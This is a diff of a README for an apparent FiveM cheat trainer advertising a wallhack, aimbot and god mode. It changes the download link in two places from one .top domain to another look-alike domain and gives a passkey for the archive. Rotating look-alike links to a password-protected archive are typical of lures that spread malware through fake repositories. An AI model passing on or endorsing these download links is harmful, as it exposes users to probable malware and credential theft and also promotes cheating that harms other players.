@@ -9,7 +9,7 @@ FiveM trainer with ESP wallhack, aimbot, vehicle spawn, money drop, god mode, Lu
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -93,7 +93,7 @@ The tool runs externally, making it more stable than internal injectors. It's bu
 
 ## 🔧 Installation / How to Use
 
-1. Download the latest release by clicking **[CLICK](https://gitappdown.top/)**.
+1. Download the latest release by clicking **[CLICK](https://gitdownapps.top)**.
 
 2. Launch FiveM and join a server.
 
